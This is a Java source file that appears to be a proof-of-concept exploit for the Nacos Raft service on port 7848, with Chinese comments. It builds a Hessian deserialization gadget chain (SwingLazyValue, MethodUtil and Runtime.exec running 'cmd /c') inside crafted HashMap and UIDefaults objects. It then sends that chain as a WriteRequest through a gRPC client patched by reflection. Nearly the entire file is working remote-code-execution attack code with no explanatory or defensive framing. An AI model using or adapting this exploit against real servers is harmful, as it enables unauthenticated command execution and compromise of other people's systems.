package org.example;

import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.GrpcClient;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.google.protobuf.ByteString;
import com.google.protobuf.Message;
import sun.reflect.misc.MethodUtil;
import sun.swing.SwingLazyValue;;

import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;


public class Main {

    public static void send1(String addr, byte[] payload) throws Exception {
        Configuration conf = new Configuration();
        conf.parse(addr);
        // 刷新路由表
        RouteTable.getInstance().updateConfiguration("nacos", conf);
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());
        RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 1000).isOk();
        // ⽬标 nacos Raft Server
        PeerId leader = PeerId.parsePeer(addr);
        // 初始化 CliService 和 CliClientService 客户端
        Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
        parserClasses.setAccessible(true);
        ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient());
        map.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());
        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());
        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_persistent_service_v2").setData(ByteString.copyFrom(payload)).build();
        cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), writeRequest, 5000);
    }

    public static byte[] build(String cmd) throws Exception {
        String[]       command        = {"cmd", "/c", cmd};
        Method         invoke         = MethodUtil.class.getMethod("invoke", Method.class, Object.class, Object[].class);
        Method         exec           = Runtime.class.getMethod("exec", String[].class);
        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{command}}});
        //Object value = swingLazyValue.createValue(new UIDefaults());
        //
        //Method getClassFactoryMethod = SerializerFactory.class.getDeclaredMethod("getClassFactory");
        //SwingLazyValue swingLazyValue1 = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{getClassFactoryMethod, SerializerFactory.createDefault(), new Object[]{}}});
        //Object value = swingLazyValue1.createValue(new UIDefaults());
        //
        //Method allowMethod = ClassFactory.class.getDeclaredMethod("allow", String.class);
        //SwingLazyValue swingLazyValue2 = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{allowMethod, value, new Object[]{"*"}}});
        //Object value1 = swingLazyValue2.createValue(new UIDefaults());
        //System.out.println(value1);

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("key", swingLazyValue);
        u2.put("key", swingLazyValue);
        HashMap     hashMap     = new HashMap();
        Class       node        = Class.forName("java.util.HashMap$Node");
        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
        constructor.setAccessible(true);
        Object node1 = constructor.newInstance(0, u1, null, null);
        Object node2 = constructor.newInstance(0, u2, null, null);
        Field  key   = node.getDeclaredField("key");
        key.setAccessible(true);
        key.set(node1, u1);
        key.set(node2, u2);
        Field size = HashMap.class.getDeclaredField("size");
        size.setAccessible(true);
        size.set(hashMap, 2);
        Field table = HashMap.class.getDeclaredField("table");
        table.setAccessible(true);
        Object arr = Array.newInstance(node, 2);
        Array.set(arr, 0, node1);
        Array.set(arr, 1, node2);
        table.set(hashMap, arr);


        HashMap hashMap1 = new HashMap();
        size.set(hashMap1, 2);
        table.set(hashMap1, arr);


        HashMap map = new HashMap();
        map.put(hashMap, hashMap);
        map.put(hashMap1, hashMap1);

        ByteArrayOutputStream baos   = new ByteArrayOutputStream();
        Hessian2Output        output = new Hessian2Output(baos);
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(map);
        output.flushBuffer();

        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(baos.toByteArray()));
        SerializerFactory.createDefault().getClassFactory().allow("*");
        hessian2Input.readObject();

        return baos.toByteArray();
    }

    public static void send3(String address, byte[] poc) throws Exception {
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());
        PeerId leader = PeerId.parsePeer(address);
        WriteRequest request = WriteRequest.newBuilder()
                .setGroup("naming_persistent_service_v2")
                .setData(ByteString.copyFrom(poc))
                .build();
        GrpcClient grpcClient = (GrpcClient) cliClientService.getRpcClient();
        //反射添加WriteRequest，不然会抛出异常
        Field parserClassesField = GrpcClient.class.getDeclaredField("parserClasses");
        parserClassesField.setAccessible(true);
        Map<String, Message> parserClasses = (Map) parserClassesField.get(grpcClient);
        parserClasses.put(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());
        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());
        Object res = grpcClient.invokeSync(leader.getEndpoint(), request, 5000);
        System.out.println(res);
    }

    public static void main(String[] args) throws Exception {
        // 只能利用一次
        //byte[] bytes = build("calc");
        send1("127.0.0.1:7848", Base64.getDecoder().decode(""));
        // 只能利用三次
        send3("127.0.0.1:7848", Base64.getDecoder().decode(""));
    }
}

